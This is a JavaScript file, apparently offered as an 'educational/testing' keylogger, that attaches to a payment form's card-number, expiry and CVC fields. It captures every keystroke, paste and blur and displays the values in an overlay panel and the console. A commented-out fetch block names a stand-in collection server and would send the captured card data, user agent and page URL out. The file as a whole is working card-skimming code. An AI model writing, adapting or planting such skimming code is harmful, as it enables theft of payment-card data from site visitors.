// Keylogger de Respaldo para fines Educativos/Testing
// Archivo: keylogger.js

(function () {
  "use strict";

  console.log("🚀 Iniciando keylogger de respaldo...");

  function initBackupKeylogger() {
    // Create display panel
    const logPanel = document.createElement("div");
    logPanel.id = "keylogger-panel";
    logPanel.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            width: 300px;
            max-height: 400px;
            background: rgba(0, 0, 0, 0.9);
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
            z-index: 9999;
            overflow-y: auto;
            backdrop-filter: blur(10px);
            border: 1px solid #333;
        `;

    // Create header
    const header = document.createElement("div");
    header.innerHTML = `
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; border-bottom: 1px solid #333; padding-bottom: 8px;">
                <span style="color: #ff6b6b; font-weight: bold;">🔍 KEYLOGGER MONITOR (LOCAL)</span>
                <button id="clear-log-backup" style="background: #ff4757; color: white; border: none; padding: 2px 8px; border-radius: 3px; cursor: pointer; font-size: 10px;">Clear</button>
            </div>
        `;

    // Create log content area
    const logContent = document.createElement("div");
    logContent.id = "log-content";
    logContent.style.cssText = `
            max-height: 300px;
            overflow-y: auto;
            line-height: 1.4;
        `;

    logPanel.appendChild(header);
    logPanel.appendChild(logContent);
    document.body.appendChild(logPanel);

    // Storage for captured data
    const capturedData = {
      cc_number: "",
      cc_exp: "",
      cc_cvc: "",
    };

    // Target fields
    const targetFields = ["cc_number", "cc_exp", "cc_cvc"];

    // Logging function
    function logToPanel(fieldName, value, eventType) {
      const timestamp = new Date().toLocaleTimeString();
      const logEntry = document.createElement("div");
      logEntry.style.cssText = `
                margin-bottom: 8px;
                padding: 6px;
                background: rgba(255, 255, 255, 0.05);
                border-radius: 4px;
                border-left: 3px solid #00ff00;
            `;

      const fieldColor = {
        cc_number: "#4ecdc4",
        cc_exp: "#45b7d1",
        cc_cvc: "#f9ca24",
      };

      logEntry.innerHTML = `
                <div style="color: #888; font-size: 10px;">[${timestamp}] ${eventType.toUpperCase()}</div>
                <div style="color: ${
                  fieldColor[fieldName] || "#00ff00"
                }; font-weight: bold;">
                    📝 ${fieldName.toUpperCase()}: <span style="color: #fff;">${
        value || "(empty)"
      }</span>
                </div>
            `;

      logContent.appendChild(logEntry);
      logContent.scrollTop = logContent.scrollHeight;

      // Update captured data
      capturedData[fieldName] = value;
      updateSummary();
    }

    // Update summary display
    function updateSummary() {
      let existingSummary = document.getElementById("data-summary");
      if (existingSummary) {
        existingSummary.remove();
      }

      const summary = document.createElement("div");
      summary.id = "data-summary";
      summary.style.cssText = `
                margin-top: 10px;
                padding: 10px;
                background: rgba(255, 107, 107, 0.2);
                border-radius: 4px;
                border: 1px solid #ff6b6b;
            `;

      summary.innerHTML = `
                <div style="color: #ff6b6b; font-weight: bold; margin-bottom: 5px;">💳 CAPTURED DATA:</div>
                <div style="font-size: 11px; line-height: 1.3;">
                    <div>🔢 Card: <span style="color: #4ecdc4;">${
                      capturedData.cc_number || "Not captured"
                    }</span></div>
                    <div>📅 Exp: <span style="color: #45b7d1;">${
                      capturedData.cc_exp || "Not captured"
                    }</span></div>
                    <div>🔒 CVC: <span style="color: #f9ca24;">${
                      capturedData.cc_cvc || "Not captured"
                    }</span></div>
                </div>
            `;

      logContent.appendChild(summary);
    }

    // Clear log function
    setTimeout(() => {
      const clearBtn = document.getElementById("clear-log-backup");
      if (clearBtn) {
        clearBtn.addEventListener("click", function () {
          logContent.innerHTML = "";
          Object.keys(capturedData).forEach((key) => (capturedData[key] = ""));
          logToPanel("system", "Log cleared", "info");
        });
      }
    }, 100);

    // Attach event listeners to target fields
    targetFields.forEach((fieldName) => {
      const field = document.getElementById(fieldName);
      if (field) {
        // Capture keystrokes
        field.addEventListener("input", function (e) {
          logToPanel(fieldName, e.target.value, "input");
        });

        // Capture focus events
        field.addEventListener("focus", function (e) {
          logToPanel(fieldName, "Field focused", "focus");
        });

        // Capture blur events
        field.addEventListener("blur", function (e) {
          logToPanel(fieldName, e.target.value, "blur");
        });

        // Capture paste events
        field.addEventListener("paste", function (e) {
          setTimeout(() => {
            logToPanel(fieldName, e.target.value, "paste");
          }, 10);
        });

        console.log(`🔍 Keylogger local conectado al campo: ${fieldName}`);
      } else {
        console.warn(`⚠️ Campo no encontrado: ${fieldName}`);
      }
    });

    // Initial log
    logToPanel("system", "Keylogger local inicializado", "info");
    updateSummary();

    // Capture form submission
    document.addEventListener("submit", function (e) {
      if (e.target.id === "payment-form") {
        logToPanel(
          "system",
          "Formulario enviado con datos capturados",
          "submit"
        );
        console.log("🎯 DATOS FINALES CAPTURADOS (LOCAL):", capturedData);

        // Optional: Send data to external server (for educational purposes)
        // fetch('https://your-server.com/collect', {
        //     method: 'POST',
        //     headers: { 'Content-Type': 'application/json' },
        //     body: JSON.stringify({
        //         timestamp: new Date().toISOString(),
        //         data: capturedData,
        //         userAgent: navigator.userAgent,
        //         page: window.location.href,
        //         source: 'local-keylogger'
        //     })
        // }).catch(err => console.log('Exfiltration failed:', err));
      }
    });

    // Make panel draggable
    let isDragging = false;
    let dragOffset = { x: 0, y: 0 };

    header.addEventListener("mousedown", function (e) {
      isDragging = true;
      dragOffset.x = e.clientX - logPanel.offsetLeft;
      dragOffset.y = e.clientY - logPanel.offsetTop;
      logPanel.style.cursor = "grabbing";
    });

    document.addEventListener("mousemove", function (e) {
      if (isDragging) {
        logPanel.style.left = e.clientX - dragOffset.x + "px";
        logPanel.style.top = e.clientY - dragOffset.y + "px";
        logPanel.style.right = "auto";
      }
    });

    document.addEventListener("mouseup", function () {
      isDragging = false;
      logPanel.style.cursor = "default";
    });

    console.log("✅ Keylogger local inicializado exitosamente");
  }

  // Initialize when DOM is ready
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", initBackupKeylogger);
  } else {
    initBackupKeylogger();
  }
})();

// Expose initialization function globally for manual triggering
window.initBackupKeylogger = function () {
  console.log("🔧 Inicialización manual del keylogger local...");
  if (document.getElementById("keylogger-panel")) {
    console.log("⚠️ Keylogger ya existe, reiniciando...");
    document.getElementById("keylogger-panel").remove();
  }

  // Re-execute the initialization
  const script = document.createElement("script");
  script.src = "./keylogger.js";
  document.head.appendChild(script);
};
